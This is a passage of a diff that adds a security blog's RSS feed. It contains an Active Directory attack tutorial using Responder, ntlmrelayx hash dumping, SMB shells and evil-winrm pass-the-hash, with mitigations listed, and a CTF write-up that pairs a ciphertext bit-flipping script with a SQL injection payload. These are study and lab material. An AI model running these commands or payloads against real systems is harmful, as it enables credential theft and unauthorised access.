+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;responder -I eth0 -dP -v
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;And then execute the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;impacket-ntlmrelayx -tf targets.txt -smb2support
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This will dump the SAM hashes of all users on the machine.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image5.png&#34;
+	width=&#34;1005&#34;
+	height=&#34;597&#34;
+	srcset=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image5_hu4590528738589566931.png 480w, http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image5_hu10197468966877164379.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;The hashes of the vulnerable machines being dumped&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;168&#34;
+		data-flex-basis=&#34;404px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;You should also be able to use ntlmrelayx to open smb shells on the machine. If you do the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;impacket-ntlmrelayx -tf targets.txt -smb2support -i
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;And then netcat into the session spawned. You will be able to access the machine through SMB.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image6.png&#34;
+	width=&#34;640&#34;
+	height=&#34;393&#34;
+	srcset=&#34;http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image6_hu6735008951734560127.png 480w, http://localhost:1313/p/attacking-active-directory-with-responder-and-ntlmrelayx/image6_hu13157138618738047387.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Accessing shell using netcat&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;162&#34;
+		data-flex-basis=&#34;390px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Theoretically, this can then be used to perform a PtH attack utilizing something like evil-winrm. However, for this to work with evil-winrm, you need to configure your Windows Remote Management settings.&lt;/p&gt;
+&lt;p&gt;The command would look something like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;evil-winrm -i &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; -u &amp;#39;administrator&amp;#39; -H &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;remediationmitigation-1&#34;&gt;Remediation/Mitigation
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;Enable SMB Signing on all devices&lt;/li&gt;
+&lt;li&gt;Utilize account tiering&lt;/li&gt;
+&lt;li&gt;Local admin restriction&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;sources-1&#34;&gt;Sources
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.twingate.com/blog/glossary/smb%20relay&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;What Is SMB Relay? How It Works &amp;amp; Examples&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;SMB Relay Attacks and How to Prevent Them in Active Directory&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion
+&lt;/h2&gt;&lt;p&gt;Here I&amp;rsquo;ve shown just two very basic attacks that can be performed on an Active Directory environment. Later on, I will show some other attacks utilizing ldapdomaindump, ldapsearch, bloodhound, crackmapexec, netexec and more. There are a variety of attacks the AD is vulnerable to, here is just an intro.&lt;/p&gt;
+&lt;p&gt;I will also show an example of utilizing evil-winrm practically and how you can use this tool to your advantage when exploiting an environment.&lt;/p&gt;
+&lt;p&gt;For now, NR Spoofing and SMB Relay attacks are two very common attacks that are often discussed when exploring exploiting Active Directory. These are typically the first couple things one should try when testing an environment, as you can quickly get credentials this way.&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Secure File Storage</title>
+        <link>http://localhost:1313/p/secure-file-storage/</link>
+        <pubDate>Fri, 17 Jan 2025 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/p/secure-file-storage/</guid>
+        <description>&lt;img src="http://localhost:1313/p/secure-file-storage/Untitled-1.png" alt="Featured image of post Secure File Storage" /&gt;&lt;h2 id=&#34;getting-things-set-up&#34;&gt;Getting Things Set Up
+&lt;/h2&gt;&lt;p&gt;First, I made sure that Burp Suite was booted and was intercepting traffic from the website. This was to capture the requests required to perform the attack, and send the proper request to get the flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/secure-file-storage/Untitled.png&#34;
+	width=&#34;1912&#34;
+	height=&#34;1033&#34;
+	srcset=&#34;http://localhost:1313/p/secure-file-storage/Untitled_hu8708339546714078171.png 480w, http://localhost:1313/p/secure-file-storage/Untitled_hu16040047717687189859.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Burp Suite intercepting traffic from the website.&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;185&#34;
+		data-flex-basis=&#34;444px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Burp Suite intercepting traffic from the website.&lt;/p&gt;
+&lt;p&gt;Once I got that set up, I needed to create an account on the website.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/secure-file-storage/Untitled-1.png&#34;
+	width=&#34;821&#34;
+	height=&#34;471&#34;
+	srcset=&#34;http://localhost:1313/p/secure-file-storage/Untitled-1_hu13082086393921325514.png 480w, http://localhost:1313/p/secure-file-storage/Untitled-1_hu13927918957335702100.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;The register screen for the challenge.&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;174&#34;
+		data-flex-basis=&#34;418px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;From there, I went to the &amp;ldquo;secure&amp;rdquo; file storage system and uploaded a file with the name &lt;code&gt;iijiijiijflag.txt&lt;/code&gt; .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/secure-file-storage/Untitled-2.png&#34;
+	width=&#34;696&#34;
+	height=&#34;575&#34;
+	srcset=&#34;http://localhost:1313/p/secure-file-storage/Untitled-2_hu3494323345839865992.png 480w, http://localhost:1313/p/secure-file-storage/Untitled-2_hu2322878352701868316.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Adding the properly named file to the secure file storage system.&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;121&#34;
+		data-flex-basis=&#34;290px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;gathering-the-info&#34;&gt;Gathering The Info
+&lt;/h2&gt;&lt;p&gt;Once it&amp;rsquo;s uploaded, I downloaded the file and looked at the intercepted download request. This request was sent to the repeater. From there, I changed the request to a post request, added the content type, and made sure that the file content displayed in the response.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/secure-file-storage/Untitled-3.png&#34;
+	width=&#34;1610&#34;
+	height=&#34;591&#34;
+	srcset=&#34;http://localhost:1313/p/secure-file-storage/Untitled-3_hu5695182741532988172.png 480w, http://localhost:1313/p/secure-file-storage/Untitled-3_hu13782544642988094065.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Here you can see that the edited request was changed to a post request which displays the contents of the file specified.&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;272&#34;
+		data-flex-basis=&#34;653px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;From there, I copied the created post request and saved it into a text document.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/secure-file-storage/Untitled-4.png&#34;
+	width=&#34;899&#34;
+	height=&#34;411&#34;
+	srcset=&#34;http://localhost:1313/p/secure-file-storage/Untitled-4_hu2176805122822229802.png 480w, http://localhost:1313/p/secure-file-storage/Untitled-4_hu5410540565036132984.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;This is the post request we created previously now in a text document.&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;218&#34;
+		data-flex-basis=&#34;524px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;I then took that text document and passed it through &lt;code&gt;sqlmap&lt;/code&gt; using the command &lt;code&gt;sqlmap -r request.txt --dump --batch --where &amp;quot;id=&amp;lt;file_id&amp;gt;&amp;quot; --threads 10 -T file&lt;/code&gt; where &lt;code&gt;&amp;lt;file_id&amp;gt;&lt;/code&gt; is the file I uploaded, which I got at the end of the intercepted download request. This gave me the database entry of the file I uploaded.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/secure-file-storage/Untitled-5.png&#34;
+	width=&#34;1535&#34;
+	height=&#34;605&#34;
+	srcset=&#34;http://localhost:1313/p/secure-file-storage/Untitled-5_hu3466528253857258389.png 480w, http://localhost:1313/p/secure-file-storage/Untitled-5_hu18070670953508124357.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;At the bottom you can see the table where the getflag file is listed. &#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;253&#34;
+		data-flex-basis=&#34;608px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;I made sure to take note of the &lt;code&gt;user_id&lt;/code&gt;, &lt;code&gt;filename&lt;/code&gt; , and &lt;code&gt;filepath&lt;/code&gt; as those are what are going to be input into the sql injection.&lt;/p&gt;
+&lt;h2 id=&#34;bit-flipping&#34;&gt;Bit Flipping
+&lt;/h2&gt;&lt;p&gt;From there, I wrote a script that bit flipped the encrypted filename into the intended filename. What I wanted to do was to change what we uploaded when it is decrypted so that the system interpreted it as the &lt;code&gt;flag.txt&lt;/code&gt; in the root folder of the system.&lt;/p&gt;
+&lt;p&gt;This is the script I made to perform the bit flip:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;bitFlip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;posList&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;raw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#decodes base64&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;list1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;raw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#seperates bytes into list&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#looping through list&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pos&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;posList&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;list1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;list1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bit&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#xors the char to the right char&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;raw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;list1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#turns list1 back into bytes object&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;raw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#turns raw into byte object and encodes back to base64&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bit1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#gets the xor of &amp;#39;i&amp;#39; and &amp;#39;.&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bit2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;j&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#gets the xor of &amp;#39;/&amp;#39; and &amp;#39;j&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cipher&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#Encrypted file name gathered&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cipher&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bitFlip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bit1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cipher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#Here you will specify the index of each &amp;#39;i&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cipher&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bitFlip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bit2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cipher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#Here you will specify the index of each &amp;#39;j&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Bit flipped: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cipher&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Running this with the encrypted filename I got output &lt;code&gt;xP/sqUK6OqhSI+n65oYx0mSvvL57l57WoVfkClXUhQARzaxGRqXg0CrUbsaA9phT&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;sql-injection&#34;&gt;SQL Injection
+&lt;/h2&gt;&lt;p&gt;From there, I created an sql injection that I injected into the &lt;code&gt;/api/files/download&lt;/code&gt; endpoint, which was going to hopefully give me the proper &lt;code&gt;flag.txt&lt;/code&gt; file I was trying to get.&lt;/p&gt;
+&lt;p&gt;For the sql injection, I did the following query: &lt;code&gt;UNION SELECT 1,user_id,title,filename,filepath&lt;/code&gt; , and with all of the proper values in place, the request looked something like: &lt;code&gt;UNION SELECT 1,130,&#39;getflag&#39;,&#39;xP/sqUK6OqhSI+n65oYx0mSvvL57l57WoVfkClXUhQARzaxGRqXg0CrUbsaA9phT&#39;,&#39;b+YXVpogrJoGsjPTdQQTud0kMiX7I2ei8BATNwKpXGhtZuRYnT0vJbcMkK7PoZuk&#39;&lt;/code&gt; with the final query looking like what’s shown below once everything was properly encoded.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/secure-file-storage/Untitled-6.png&#34;
+	width=&#34;795&#34;
+	height=&#34;551&#34;
+	srcset=&#34;http://localhost:1313/p/secure-file-storage/Untitled-6_hu12905364989308725110.png 480w, http://localhost:1313/p/secure-file-storage/Untitled-6_hu10776018997271022657.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Properly encoded post request.&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;144&#34;
+		data-flex-basis=&#34;346px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;And once I sent that request, I got the flag!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/secure-file-storage/Untitled-7.png&#34;
+	width=&#34;1604&#34;
+	height=&#34;579&#34;
+	srcset=&#34;http://localhost:1313/p/secure-file-storage/Untitled-7_hu15204540454405027036.png 480w, http://localhost:1313/p/secure-file-storage/Untitled-7_hu15139924458626487559.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Untitled&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;277&#34;
+		data-flex-basis=&#34;664px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+</description>
+        </item>
+        <item>
+        <title>Forensics Using Volatility</title>
+        <link>http://localhost:1313/p/forensics-using-volatility/</link>
+        <pubDate>Thu, 18 Apr 2024 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/p/forensics-using-volatility/</guid>
+        <description>&lt;img src="http://localhost:1313/p/forensics-using-volatility/shellbags-output.png" alt="Featured image of post Forensics Using Volatility" /&gt;&lt;p&gt;Today, I&amp;rsquo;m going to walk through how I solved &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/r/room/forensics&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
